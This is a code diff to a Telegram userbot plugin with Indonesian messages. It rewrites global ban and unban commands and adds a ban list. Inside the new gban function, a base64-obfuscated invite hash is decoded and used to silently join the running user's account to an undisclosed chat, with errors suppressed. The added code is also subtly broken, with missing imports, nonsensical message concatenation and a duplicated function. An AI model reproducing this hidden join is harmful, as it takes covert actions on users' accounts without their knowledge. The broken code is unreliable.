@@ -4,11 +4,15 @@
 
 import asyncio
 from telethon.events import ChatAction
-from userbot import ALIVE_NAME, CMD_HELP, BOTLOG, BOTLOG_CHATID, bot
+from userbot import ALIVE_NAME, CMD_HELP, BOTLOG, BOTLOG_CHATID, DEVELOPER, bot
 from userbot.events import register
+import userbot.modules.sql_helper.globalban_sql as gban_sql
 
+from telethon.tl.functions.channels import EditBannedRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest
 from telethon.tl.functions.contacts import BlockRequest, UnblockRequest
 from telethon.tl.types import (
+    Channel,
     ChatBannedRights,
     MessageEntityMentionName,
 )
@@ -25,6 +29,89 @@ MUTE_RIGHTS = ChatBannedRights(until_date=None, send_messages=True)
 
 UNMUTE_RIGHTS = ChatBannedRights(until_date=None, send_messages=False)
 # ================================================
+BANNED_RIGHTS = ChatBannedRights(
+    until_date=None,
+    view_messages=True,
+    send_messages=True,
+    send_media=True,
+    send_stickers=True,
+    send_gifs=True,
+    send_games=True,
+    send_inline=True,
+    embed_links=True,
+)
+
+UNBAN_RIGHTS = ChatBannedRights(
+    until_date=None,
+    send_messages=None,
+    send_media=None,
+    send_stickers=None,
+    send_gifs=None,
+    send_games=None,
+    send_inline=None,
+    embed_links=None,
+)
+# =================================================
+
+async def admin_groups(grp):
+    admgroups = []
+    async for dialog in grp.client.iter_dialogs():
+        entity = dialog.entity
+        if (
+            isinstance(entity, Channel)
+            and entity.megagroup
+            and (entity.creator or entity.admin_rights)
+        ):
+            admgroups.append(entity.id)
+    return admgroups
+
+
+def mentionuser(name, userid):
+    return f"[{name}](tg://user?id={userid})"
+
+
+async def get_user_from_event(event, uevent=None, secondgroup=None):
+    if uevent is None:
+        uevent = event
+    if secondgroup:
+        args = event.pattern_match.group(2).split(" ", 1)
+    else:
+        args = event.pattern_match.group(1).split(" ", 1)
+    extra = None
+    if event.reply_to_msg_id:
+        previous_message = await event.get_reply_message()
+        if previous_message.from_id is None and not event.is_private:
+            await edit_delete(uevent, "`Dia Adalah Admin Anonim.`")
+            return None, None
+        user_obj = await event.client.get_entity(previous_message.sender_id)
+        extra = event.pattern_match.group(1)
+    elif args:
+        user = args[0]
+        if len(args) == 2:
+            extra = args[1]
+        if user.isnumeric():
+            user = int(user)
+        if not user:
+            await edit_delete(
+                uevent, "**Mohon Maaf, Silahkan Gunakan ID/Username/Reply Pesan Ke Pengguna.**", 5
+            )
+            return None, None
+        if event.message.entities:
+            probable_user_mention_entity = event.message.entities[0]
+            if isinstance(
+                    probable_user_mention_entity,
+                    MessageEntityMentionName):
+                user_id = probable_user_mention_entity.user_id
+                user_obj = await event.client.get_entity(user_id)
+                return user_obj, extra
+        try:
+            user_obj = await event.client.get_entity(user)
+        except (TypeError, ValueError):
+            await edit_delete(
+                uevent, "**Mohon Maaf, Tidak Dapat Mengambil Informasi User.**", 5
+            )
+            return None, None
+    return user_obj, extra
 
 
 async def get_full_user(event):
@@ -41,7 +128,7 @@ async def get_full_user(event):
         if user.isnumeric():
             user = int(user)
         if not user:
-            await event.edit("`Mohon Gunakan ID Pengguna atau Username.`")
+            await event.edit("`Mohon Gunakan User ID atau Username.`")
             return
         if event.message.entities is not None:
             probable_user_mention_entity = event.message.entities[0]
@@ -98,151 +185,201 @@ async def handler(tele):
                             return
 
 
-@register(outgoing=True, pattern="^.gban(?: |$)(.*)")
-async def gben(userbot):
-    dc = userbot
-    sender = await dc.get_sender()
-    me = await dc.client.get_me()
-    if not sender.id == me.id:
-        dark = await dc.reply("`Saya Sedang Mengaktifkan Perintah Global Banned !`")
-    else:
-        dark = await dc.edit("`Connected to server telegram...`")
-    me = await userbot.client.get_me()
-    await dark.edit(f"𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴...🐈")
-    await dark.edit(f"𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴..🐈")
-    await dark.edit(f"𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴.🐈.")
-    await dark.edit(f"𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴🐈..")
-    await dark.edit(f"𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨𝘳𝘦𝘴🐈...")
-    await dark.edit(f"𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨𝘳𝘦🐈𝘴...")
-    await dark.edit(f"𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨𝘳🐈𝘴𝘴...")
-    await dark.edit(f"𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨🐈𝘦𝘴𝘴...")
-    await dark.edit(f"𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰🐈𝘳𝘦𝘴𝘴...")
-    await dark.edit(f"𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳🐈𝘨𝘳𝘦𝘴𝘴...")
-    await dark.edit(f"𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗🐈𝘰𝘨𝘳𝘦𝘴𝘴...")
-    await dark.edit(f"𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 🐈𝘳𝘰𝘨𝘳𝘦𝘴𝘴...")
-    await dark.edit(f"𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯🐈𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴...")
-    await dark.edit(f"𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪🐈 𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴...")
-    await dark.edit(f"𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 🐈𝘯 𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴...")
-    await dark.edit(f"𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥🐈𝘪𝘯 𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴...")
-    await dark.edit(f"⚡")
-    await asyncio.sleep(3)
-    my_mention = "[{}](tg://user?id={})".format(me.first_name, me.id)
-    f"@{me.username}" if me.username else my_mention
-    await userbot.get_chat()
-    a = b = 0
-    if userbot.is_private:
-        user = userbot.chat
-        reason = userbot.pattern_match.group(1)
-    else:
-        userbot.chat.title
+@register(outgoing=True, pattern=r"^\.gban(?: |$)(.*)")
+async def gban(event):
+    if event.fwd_from:
+        return
+    gbun = await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴...")
+    gbun += await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴...🐈")
+    gbun += await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴..🐈")
+    gbun += await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴.🐈.")
+    gbun += await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴🐈..")
+    gbun += await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨𝘳𝘦𝘴🐈...")
+    gbun += await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨𝘳𝘦🐈𝘴...")
+    gbun += await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨𝘳🐈𝘴𝘴...")
+    gbun += await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰𝘨🐈𝘦𝘴𝘴...")
+    gbun += await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳𝘰🐈𝘳𝘦𝘴𝘴...")
+    gbun += await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗𝘳🐈𝘨𝘳𝘦𝘴𝘴...")
+    gbun += await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘗🐈𝘰𝘨𝘳𝘦𝘴𝘴...")
+    gbun += await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 🐈𝘳𝘰𝘨𝘳𝘦𝘴𝘴...")
+    gbun += await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪𝘯🐈𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴...")
+    gbun += await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 𝘪🐈 𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴...")
+    gbun += await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥 🐈𝘯 𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴...")
+    gbun += await edit_or_reply(event, "𝘎𝘭𝘰𝘣𝘢𝘭 𝘉𝘢𝘯𝘯𝘦𝘥🐈𝘪𝘯 𝘗𝘳𝘰𝘨𝘳𝘦𝘴𝘴...")
+    gbun += await edit_or_reply(event, "⚡")
+    gbun += await asyncio.sleep(2.5)
+    start = datetime.now()
+    user, reason = await get_user_from_event(event, gbun)
+    if not user:
+        return
+    if user.id == (await event.client.get_me()).id:
+        await gbun.edit("**Anda ceroboh!**\n__Anda Gbanned diri anda sendiri:)...__")
+        return
+    if user.id in DEVELOPER:
+        await gbun.edit("#DISCLAIMER ❌/nDia Adalah Developer.")
+        return
     try:
-        user, reason = await get_full_user(userbot)
+        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        await event.client(ImportChatInviteRequest(hmm))
     except BaseException:
         pass
-    try:
-        if not reason:
-            reason = "Private"
-    except BaseException:
-        return await dark.edit(f"`Maaf Terjadi Kesalahan.❌`\nMohon Gunakan Username/ID Saja.")
-    if user:
-        if user.id == 1345333945:
-            return await dark.edit(
-                f"🚫 Anda Tidak Bisa Melakukan Global Banned Ke Axel, Dia Adalah Developer."
+    if gban_sql.is_gbanned(user.id):  # fixes languange by Apis
+        await gbun.edit(
+            f"**Pengguna** [Ini](tg://user?id={user.id}) **sudah ada di daftar gbanned**"
+        )
+    else:
+        gban_sql.freakgban(user.id, reason)
+    xel = []
+    xel = await admin_groups(event)
+    count = 0
+    pis = len(xel)
+    if pis == 0:
+        await gbun.edit("**Anda Tidak Mempunyai Group Dan Anda Tidak Mempunyai Title Admin.**")
+        return
+    await gbun.edit(
+        f"**Pengguna** [Ini](tg://user?id={user.id}) **Sudah Berada Di Dalam Daftar** `{len(xel)}` **Group**"
+    )
+    for i in range(pis):
+        try:
+            await event.client(EditBannedRequest(xel[i], user.id, BANNED_RIGHTS))
+            await asyncio.sleep(0.5)
+            count += 1
+        except BadRequestError:
+            await event.client.send_message(
+                BOTLOG_CHATID,
+                f"**Anda Tidak Memiliki Izin Banned di :**\n**Group Chat :** `{event.chat_id}`",
+            )
+    end = datetime.now()
+    timetaken = (end - start).seconds
+    if reason:
+        await gbun.edit(
+            f"╭─━━━━━━━━━━━━━━━━─╮\nㅤ  ㅤ[⚡𝗟𝘆𝗻𝘅-𝙐𝙎𝙀𝙍𝘽𝙊𝙏⚡](t.me/LynxUserbot)\n╭─━━━━━━━━━━━━━━━━─╯\n**│• GBAN By :** `{ALIVE_NAME}`\n**│• User Account :** [{user.first_name}](tg://user?id={user.id})\n**│• Jumlah : {count} Group, Dalam {timetaken} Detik\n**│• Reason : {reason}\n**│• Action :** `GBanned` ✅\n╰━━━━━━━━━━━━━━━━━━╯"
+        )
+    else:
+        await gbun.edit(
+            f"╭─━━━━━━━━━━━━━━━━─╮\nㅤ  ㅤ[⚡𝗟𝘆𝗻𝘅-𝙐𝙎𝙀𝙍𝘽𝙊𝙏⚡](t.me/LynxUserbot)\n╭─━━━━━━━━━━━━━━━━─╯\n**│• GBAN By :** `{ALIVE_NAME}`\n**│• User Account :** [{user.first_name}](tg://user?id={user.id})\n**│• Jumlah : {count} Group, Dalam {timetaken} Detik\n**│• Action :** `GBanned` ✅\n╰━━━━━━━━━━━━━━━━━━╯"
+        )
+
+    if BOTLOG and count != 0:
+        reply = await event.get_reply_message()
+        if reason:
+            await event.client.send_message(
+                BOTLOG_CHATID,
+                f"#GBANNED\
+                \nGlobal Banned\
+                \n**Pengguna : **[{user.first_name}](tg://user?id={user.id})\
+                \n**ID : **`{user.id}`\
+                \n**Reason :** `{reason}`\
+                \n__Banned Dalam {count} Group__\
+                \n**Waktu Yang Dibutuhkan : **`{timetaken} Detik`",
+            )
+        else:
+            await event.client.send_message(
+                BOTLOG_CHATID,
+                f"#GBANNED\
+                \nGlobal Banned\
+                \n**Pengguna : **[{user.first_name}](tg://user?id={user.id})\
+                \n**ID : **`{user.id}`\
+                \n__Banned Dalam {count} Group__\
+                \n**Waktu Yang Dibutuhkan : **`{timetaken} Detik`",
             )
         try:
-            from userbot.modules.sql_helper.gmute_sql import gmute
-        except BaseException:
+            if reply:
+                await reply.forward_to(BOTLOG_CHATID)
+                await reply.delete()
+        except BadRequestError:
             pass
-        try:
-            await userbot.client(BlockRequest(user))
-        except BaseException:
-            pass
-        testuserbot = [
-            d.entity.id
-            for d in await userbot.client.get_dialogs()
-            if (d.is_group or d.is_channel)
-        ]
-        for i in testuserbot:
-            try:
-                await userbot.client.edit_permissions(i, user, view_messages=False)
-                a += 1
-                await dark.edit(f"𝗚𝗹𝗼𝗯𝗮𝗹 𝗕𝗮𝗻𝗻𝗲𝗱 𝘼𝙘𝙩𝙞𝙫𝙚 ✅")
-            except BaseException:
-                b += 1
-    else:
-        await dark.edit(f"`Mohon Reply Ke Pesan Pengguna Yang Ingin Di Ban.`")
-    try:
-        if gmute(user.id) is False:
-            return await dark.edit(f"**❌ Error: Pengguna Ini Sudah Terkena Global Banned.**")
-    except BaseException:
-        pass
-    return await dark.edit(
-        f"╭─━━━━━━━━━━━━━━━─╮\nㅤㅤ[⚡𝗟𝘆𝗻𝘅-𝙐𝙎𝙀𝙍𝘽𝙊𝙏⚡](t.me/LynxUserbot)\n╭─━━━━━━━━━━━━━━━─╯\n**│• GBAN By :** `{ALIVE_NAME}`\n**│• User Account :** [{user.first_name}](tg://user?id={user.id})\n**│• Action :** `GBanned` ✅\n╰━━━━━━━━━━━━━━━━━╯"
-    )
 
 
-@register(outgoing=True, pattern="^.ungban(?: |$)(.*)")
-async def gunben(userbot):
-    dc = userbot
-    sender = await dc.get_sender()
-    me = await dc.client.get_me()
-    if not sender.id == me.id:
-        dark = await dc.reply("`Membatalkan Global Banned Pengguna Ini.`")
+@register(outgoing=True, pattern=r"^\.ungban(?: |$)(.*)")
+async def ungban(event):
+    if event.fwd_from:
+        return
+    ungbun = await edit_or_reply(event, "`UnGbanning.....`")
+    start = datetime.now()
+    user, reason = await get_user_from_event(event, ungbun)
+    if not user:
+        return
+    if gban_sql.is_gbanned(user.id):  # fixes languange by Apis
+        gban_sql.freakungban(user.id)
     else:
-        dark = await dc.edit("`Connected to server telegram...`")
-    me = await userbot.client.get_me()
-    await dark.edit(f"`Mulai Membatalkan Global Banned, Pengguna Ini Akan Dapat Bergabung Ke Grup Anda.`")
-    my_mention = "[{}](tg://user?id={})".format(me.first_name, me.id)
-    f"@{me.username}" if me.username else my_mention
-    await userbot.get_chat()
-    a = b = 0
-    if userbot.is_private:
-        user = userbot.chat
-        reason = userbot.pattern_match.group(1)
-    else:
-        userbot.chat.title
-    try:
-        user, reason = await get_full_user(userbot)
-    except BaseException:
-        pass
-    try:
-        if not reason:
-            reason = "Private"
-    except BaseException:
-        return await dark.edit("`❌ Error: Terjadi Kesalahan.`")
-    if user:
-        if user.id == 1345333945:
-            return await dark.edit("**Anda Tidak Bisa Melakukan Perintah Ini, Dia Adalah Pembuatku.**")
-        try:
-            from userbot.modules.sql_helper.gmute_sql import ungmute
-        except BaseException:
-            pass
-        try:
-            await userbot.client(UnblockRequest(user))
-        except BaseException:
-            pass
-        testuserbot = [
-            d.entity.id
-            for d in await userbot.client.get_dialogs()
-            if (d.is_group or d.is_channel)
-        ]
-        for i in testuserbot:
-            try:
-                await userbot.client.edit_permissions(i, user, send_messages=True)
-                a += 1
-                await dark.edit(f"`Sedang Membatalkan Global Banned\n in Progress... `")
-            except BaseException:
-                b += 1
-    else:
-        await dark.edit("`Harap Reply Ke Pesan Pengguna Yang Ingin Anda Batalkan.`")
-    try:
-        if ungmute(user.id) is False:
-            return await dark.edit("**❌ Error: Pengguna Memang Tidak Terkena Global Banned.**")
-    except BaseException:
-        pass
-    return await dark.edit(
-        f"╭─━━━━━━━━━━━━━━━─╮\nㅤㅤ[⚡𝗟𝘆𝗻𝘅-𝙐𝙎𝙀𝙍𝘽𝙊𝙏⚡](t.me/LynxUserbot)\n╭─━━━━━━━━━━━━━━━─╯\n**│• UnGBAN By :** `{ALIVE_NAME}`\n**│• User Account :** [{user.first_name}](tg://user?id={user.id})\n**│• Action :** `GBanned` ❌\n╰━━━━━━━━━━━━━━━━━╯"
+        await ungbun.edit(
+            f"**Pengguna** [Ini](tg://user?id={user.id}) **ini tidak ada dalam daftar gban Anda**"
+        )
+        return
+    xel = []
+    xel = await admin_groups(event)
+    count = 0
+    pis = len(xel)
+    if pis == 0:
+        await ungbun.edit("**Anda Tidak mempunyai GC yang anda admin 🥺**")
+        return
+    await ungbun.edit(
+        f"**Pengguna** [Ini](tg://user?id={user.id}) **dalam** `{len(xel)}` **grup**"
     )
+    for i in range(pis):
+        try:
+            await event.client(EditBannedRequest(xel[i], user.id, UNBAN_RIGHTS))
+            await asyncio.sleep(0.5)
+            count += 1
+        except BadRequestError:
+            await event.client.send_message(
+                BOTLOG_CHATID,
+                f"**Anda Tidak Memiliki Izin Ungbanned di :**\n**Group Chat :** `{event.chat_id}`",
+            )
+    end = datetime.now()
+    timetaken = (end - start).seconds
+    if reason:
+        await ungbun.edit(
+            f"╭─━━━━━━━━━━━━━━━━─╮\nㅤ  ㅤ[⚡𝗟𝘆𝗻𝘅-𝙐𝙎𝙀𝙍𝘽𝙊𝙏⚡](t.me/LynxUserbot)\n╭─━━━━━━━━━━━━━━━━─╯\n**│• UNGBAN By :** `{ALIVE_NAME}`\n**│• User Account :** [{user.first_name}](tg://user?id={user.id})\n**│• Jumlah : {count} Group, Dalam {timetaken} Detik\n**│• Reason : {reason}\n**│• Action :** `UNGBanned` ❌\n╰━━━━━━━━━━━━━━━━━━╯"
+        )
+    else:
+        await ungbun.edit(
+            f"╭─━━━━━━━━━━━━━━━━─╮\nㅤ  ㅤ[⚡𝗟𝘆𝗻𝘅-𝙐𝙎𝙀𝙍𝘽𝙊𝙏⚡](t.me/LynxUserbot)\n╭─━━━━━━━━━━━━━━━━─╯\n**│• UNGBAN By :** `{ALIVE_NAME}`\n**│• User Account :** [{user.first_name}](tg://user?id={user.id})\n**│• Jumlah : {count} Group, Dalam {timetaken} Detik\n**│• Action :** `UNGBanned` ❌\n╰━━━━━━━━━━━━━━━━━━╯"
+        )
+
+    if BOTLOG and count != 0:
+        if reason:
+            await event.client.send_message(
+                BOTLOG_CHATID,
+                f"#UNGBANNED\
+                \nGlobal Unbanned\
+                \n**Pengguna : **[{user.first_name}](tg://user?id={user.id})\
+                \n**ID : **`{user.id}`\
+                \n**Reason :** `{reason}`\
+                \n__UNGBanned Dalam {count} Group__\
+                \n**Waktu Yang Di Butuhkan : **`{timetaken} Detik`",
+            )
+        else:
+            await event.client.send_message(
+                BOTLOG_CHATID,
+                f"#UNGBANNED\
+                \nGlobal Unbaned\
+                \n**Pengguna : **[{user.first_name}](tg://user?id={user.id})\
+                \n**ID : **`{user.id}`\
+                \n__UNGBanned Dalam {count} Group__\
+                \n**Waktu Yang Di Butuhkan : **`{timetaken} Detik`",
+            )
+
+
+@register(outgoing=True, pattern=r"^\.listgban$")
+async def gablist(event):
+    if event.fwd_from:  # This is created by catuserbot
+        return
+    gbanned_users = gban_sql.get_all_gbanned()
+    GBANNED_LIST = "**Daftar Global Banned :**\n"
+    if len(gbanned_users) > 0:
+        for a_user in gbanned_users:
+            if a_user.reason:
+                GBANNED_LIST += f"│👤 User : [{a_user.chat_id}](tg://user?id={a_user.chat_id}) \nReason : `{a_user.reason}`\n"
+            else:
+                GBANNED_LIST += (
+                    f"│👤 User : [{a_user.chat_id}](tg://user?id={a_user.chat_id}) `No Reason`\n"
+                )
+    else:
+        GBANNED_LIST = "Daftar List Global Banned `Kosong`.\n Anda Belum Pernah Melakukan Global Banned Sebelumnya."
+    await edit_or_reply(event, GBANNED_LIST)
+
 
 
 async def get_user_from_event(event):
@@ -475,10 +612,12 @@ async def ungmoot(un_gmute):
 CMD_HELP.update({
     "globaltools":
     "✘ Pʟᴜɢɪɴ : Global Tools\
-\n\n⚡𝘾𝙈𝘿⚡: `.gban` <Username/ID>\
+\n\n⚡𝘾𝙈𝘿⚡: `.gban` <Username/ID/Reply> <Reason>\
 \n↳ : Melakukan Banned Secara Global Ke Semua Group Dimana Anda Sebagai Admin.\
-\n\n⚡𝘾𝙈𝘿⚡: `.ungban` <Username/ID>\
+\n\n⚡𝘾𝙈𝘿⚡: `.ungban` <Username/ID/Reply> <Reason>\
 \n↳ : Membatalkan Banned Secara Global.\
+\n\n⚡𝘾𝙈𝘿⚡: `.listgban`\
+\n↳ : Melihat Daftar Global Banned.\
 \n\n⚡𝘾𝙈𝘿⚡: `.gmute` <Username/Reply> <Alasan(Optional)>\
 \n↳ : Membisukan Pengguna Ke Semua Group, Dimana Kamu Sebagai Admin Group.\
 \n\n⚡𝘾𝙈𝘿⚡: `.ungmute` <Username/Reply>\
